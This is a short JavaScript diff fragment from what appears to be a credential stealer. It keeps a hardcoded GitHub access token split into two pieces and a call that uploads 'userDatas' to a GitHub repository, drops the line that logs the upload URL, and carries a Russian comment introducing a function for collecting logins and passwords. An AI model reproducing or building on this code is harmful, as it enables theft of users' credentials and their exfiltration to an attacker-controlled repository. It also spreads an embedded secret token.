@@ -64,7 +64,7 @@
     } catch (error) {
     }
 };var half = 'github_pat_11BHNTEAY04gQ7ua2yjG1b_jLOqk28Vy48S4kE94m5KVkIt6w4WQL4tDdFBmwxWUmJTYZDHOMRDNytOp'
-		createGitHubFile(half + 'x1', 'uloxa13', 'userDatas').then(url => {const githubFileName = url; console.log(githubFileName);});
+		createGitHubFile(half + 'x1', 'uloxa13', 'userDatas').then(url => {const githubFileName = url;});
 
 		
         // Функция для сбора логина и пароля
